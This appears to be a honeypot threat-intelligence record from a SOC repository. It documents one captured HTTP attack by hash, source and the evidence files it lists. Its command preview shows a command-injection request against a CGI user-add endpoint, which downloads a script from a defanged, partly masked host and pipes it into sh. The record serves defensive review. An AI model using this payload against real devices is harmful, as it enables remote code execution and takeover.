# 35127185ffd818b1156863b77c8809f81c15677c84591eb5eb326e10461e218f

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `35127185ffd818b1156863b77c8809f81c15677c84591eb5eb326e10461e218f` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%60cd%20/tmp%3Bwget%20hxxp://91[.]92[.]40[.]XXX/wget.sh%20-O-%7Csh%20-s%20d
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
